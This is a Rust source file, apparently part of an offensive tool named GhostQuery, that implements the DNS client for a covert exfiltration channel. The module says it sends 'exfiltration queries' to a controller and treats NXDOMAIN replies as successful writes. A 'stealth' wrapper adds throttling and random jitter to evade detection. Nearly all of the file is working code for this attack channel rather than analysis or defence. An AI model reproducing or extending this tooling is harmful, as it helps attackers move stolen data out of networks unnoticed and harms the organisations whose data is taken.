//! DNS client for sending exfiltration queries.

use std::net::SocketAddr;
use std::time::Duration;

use tokio::time::timeout;
use trust_dns_resolver::config::{ResolverConfig, ResolverOpts};
use trust_dns_resolver::TokioAsyncResolver;

use crate::common::constants::DNS_QUERY_TIMEOUT_MS;
use crate::common::error::{GhostQueryError, Result};
use crate::common::types::DnsRecordType;
use crate::transport::dns::{DnsQuery, DnsResponse};

/// DNS client for sending queries to the controller
pub struct DnsClient {
    /// The resolver
    resolver: TokioAsyncResolver,
    /// Query timeout
    timeout: Duration,
}

impl DnsClient {
    /// Create a new DNS client with system resolver
    pub async fn new() -> Result<Self> {
        let resolver = TokioAsyncResolver::tokio(ResolverConfig::default(), ResolverOpts::default());

        Ok(Self {
            resolver,
            timeout: Duration::from_millis(DNS_QUERY_TIMEOUT_MS),
        })
    }

    /// Create with a specific DNS server
    pub async fn with_server(server: SocketAddr) -> Result<Self> {
        use trust_dns_resolver::config::{NameServerConfig, Protocol};

        let mut config = ResolverConfig::new();
        config.add_name_server(NameServerConfig {
            socket_addr: server,
            protocol: Protocol::Udp,
            tls_dns_name: None,
            trust_negative_responses: true,
            bind_addr: None,
        });

        let resolver = TokioAsyncResolver::tokio(config, ResolverOpts::default());

        Ok(Self {
            resolver,
            timeout: Duration::from_millis(DNS_QUERY_TIMEOUT_MS),
        })
    }

    /// Set query timeout
    pub fn with_timeout(mut self, timeout: Duration) -> Self {
        self.timeout = timeout;
        self
    }

    /// Send a DNS query and get the response
    pub async fn send(&self, query: &DnsQuery) -> Result<DnsResponse> {
        let result = timeout(self.timeout, self.execute_query(query)).await;

        match result {
            Ok(response) => response,
            Err(_) => Err(GhostQueryError::Timeout),
        }
    }

    /// Execute the actual DNS query
    async fn execute_query(&self, query: &DnsQuery) -> Result<DnsResponse> {
        match query.record_type {
            DnsRecordType::A => self.query_a(&query.qname).await,
            DnsRecordType::AAAA => self.query_aaaa(&query.qname).await,
            DnsRecordType::TXT => self.query_txt(&query.qname).await,
            DnsRecordType::CNAME => self.query_a(&query.qname).await, // CNAME resolves to A
            DnsRecordType::MX => self.query_a(&query.qname).await,    // MX uses A lookup
        }
    }

    /// Query for A records
    async fn query_a(&self, name: &str) -> Result<DnsResponse> {
        let response = self
            .resolver
            .lookup_ip(name)
            .await
            .map_err(|e| GhostQueryError::DnsQueryError(e.to_string()))?;

        // Get first IPv4 address
        for ip in response.iter() {
            if let std::net::IpAddr::V4(ipv4) = ip {
                // Use a default TTL since trust-dns doesn't expose TTL easily
                return DnsResponse::from_a_record(ipv4, 300);
            }
        }

        // No A record found - treat as NXDOMAIN (success for writes)
        Ok(DnsResponse::nxdomain())
    }

    /// Query for AAAA records
    async fn query_aaaa(&self, name: &str) -> Result<DnsResponse> {
        let response = self
            .resolver
            .lookup_ip(name)
            .await
            .map_err(|e| GhostQueryError::DnsQueryError(e.to_string()))?;

        // Get first IPv6 address
        for ip in response.iter() {
            if let std::net::IpAddr::V6(ipv6) = ip {
                return DnsResponse::from_aaaa_record(ipv6, 300);
            }
        }

        Ok(DnsResponse::nxdomain())
    }

    /// Query for TXT records
    async fn query_txt(&self, name: &str) -> Result<DnsResponse> {
        let response = self
            .resolver
            .txt_lookup(name)
            .await
            .map_err(|e| GhostQueryError::DnsQueryError(e.to_string()))?;

        // Get first TXT record
        for record in response.iter() {
            let txt: String = record
                .txt_data()
                .iter()
                .map(|data| String::from_utf8_lossy(data))
                .collect::<Vec<_>>()
                .join("");

            if !txt.is_empty() {
                return DnsResponse::from_txt_record(&txt, 300);
            }
        }

        Ok(DnsResponse::nxdomain())
    }

    /// Check connectivity by doing a simple lookup
    pub async fn check_connectivity(&self, domain: &str) -> bool {
        self.resolver.lookup_ip(domain).await.is_ok()
    }
}

/// DNS client with rate limiting and stealth features
pub struct StealthDnsClient {
    client: DnsClient,
    /// Minimum delay between queries
    min_delay: Duration,
    /// Last query time
    last_query: std::time::Instant,
    /// Add random jitter to delays
    jitter: bool,
}

impl StealthDnsClient {
    /// Create a new stealth DNS client
    pub async fn new() -> Result<Self> {
        Ok(Self {
            client: DnsClient::new().await?,
            min_delay: Duration::from_millis(100),
            last_query: std::time::Instant::now(),
            jitter: true,
        })
    }

    /// Set minimum delay between queries
    pub fn with_min_delay(mut self, delay: Duration) -> Self {
        self.min_delay = delay;
        self
    }

    /// Disable jitter
    pub fn without_jitter(mut self) -> Self {
        self.jitter = false;
        self
    }

    /// Send a query with rate limiting
    pub async fn send(&mut self, query: &DnsQuery) -> Result<DnsResponse> {
        // Calculate delay
        let elapsed = self.last_query.elapsed();
        if elapsed < self.min_delay {
            let wait = self.min_delay - elapsed;
            let actual_wait = if self.jitter {
                use rand::Rng;
                let jitter = rand::thread_rng().gen_range(0..wait.as_millis() as u64 / 2);
                wait + Duration::from_millis(jitter)
            } else {
                wait
            };

            tokio::time::sleep(actual_wait).await;
        }

        self.last_query = std::time::Instant::now();
        self.client.send(query).await
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // Note: These tests require network access and may not work in all environments

    #[tokio::test]
    #[ignore] // Requires network
    async fn test_client_creation() {
        let client = DnsClient::new().await;
        assert!(client.is_ok());
    }

    #[tokio::test]
    #[ignore] // Requires network
    async fn test_connectivity_check() {
        let client = DnsClient::new().await.unwrap();
        let connected = client.check_connectivity("google.com").await;
        assert!(connected);
    }
}

